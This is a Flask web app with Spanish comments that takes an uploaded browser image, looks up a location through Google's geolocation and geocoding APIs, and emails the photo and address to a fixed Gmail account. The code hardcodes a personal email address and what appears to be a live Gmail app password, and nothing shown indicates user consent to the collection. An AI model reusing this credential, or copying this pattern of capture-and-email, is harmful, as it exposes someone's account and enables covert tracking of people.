from flask import Flask, request, jsonify, render_template
from io import BytesIO
from PIL import Image
import base64
import requests
import json
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
from dotenv import load_dotenv

app = Flask(__name__)

api_key = os.getenv('GOOGLE_API_KEY')
email_password = os.getenv('EMAIL_PASSWORD')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data['image'].split(",")[1]
    image = Image.open(BytesIO(base64.b64decode(image_data)))
    photo_path = "photo.jpg"
    image.save(photo_path)
    
    # Obten la ubicación
    location, address, maps_url = get_location(api_key)
    
    if location:
        send_email(photo_path, location, address, maps_url)
        if os.path.exists(photo_path):
            os.remove(photo_path)
        return jsonify(status="success", message="Email sent successfully.")
    else:
        return jsonify(status="error", message="Failed to obtain location.")

def get_location(api_key):
    # Uso de la API de Google Maps Geolocation para obtener una ubicación más precisa
    url = "https://www.googleapis.com/geolocation/v1/geolocate?key=" + api_key
    data = {'considerIp': True}
    response = requests.post(url, json=data)
    location = response.json()
    
    if 'location' in location:
        latlng = location['location']
        lat = latlng['lat']
        lng = latlng['lng']
        maps_url = f"https://www.google.com/maps?q={lat},{lng}"
        
        # Uso de la API de Geocoding de Google para obtener detalles de la ubicación
        geocode_url = f"https://maps.googleapis.com/maps/api/geocode/json?latlng={lat},{lng}&key={api_key}"
        geocode_response = requests.get(geocode_url)
        geocode_data = geocode_response.json()
        
        if 'results' in geocode_data and len(geocode_data['results']) > 0:
            address = geocode_data['results'][0]['formatted_address']
            return (lat, lng), address, maps_url
        else:
            return (lat, lng), "Unknown location", maps_url
    else:
        return None, None, None

def send_email(photo_path, location, address, maps_url):
    # Configuración del correo
    fromaddr = "jortizcl02@gmail.com"
    toaddr = "jortizcl02@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Foto y ubicación"
    
    body = f"Ubicación: {address}\nLatitud: {location[0]}, Longitud: {location[1]}\nGoogle Maps: {maps_url}\n\nEnlace directo: <a href='{maps_url}'>Ver ubicación en Google Maps</a>"
    msg.attach(MIMEText(body, 'html'))
    
    if photo_path and os.path.exists(photo_path):
        try:
            with open(photo_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(photo_path)}")
                msg.attach(part)
            print(f"Imagen adjunta: {photo_path}")
        except Exception as e:
            print(f"Error al adjuntar el archivo: {e}")
    else:
        print(f"No se encontró el archivo: {photo_path}")
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, "ftbq cknu iztg adyu ")  # Cambia aquí con la contraseña de aplicación
        server.sendmail(fromaddr, toaddr, msg.as_string())
        server.quit()
        print("Correo enviado con éxito")
    except Exception as e:
        print(f"Error al enviar el correo: {e}")
    
    # Elimina el archivo después de enviarlo
    if os.path.exists(photo_path):
        os.remove(photo_path)
        print(f"Archivo eliminado: {photo_path}")

if __name__ == '__main__':
    app.run(debug=True)

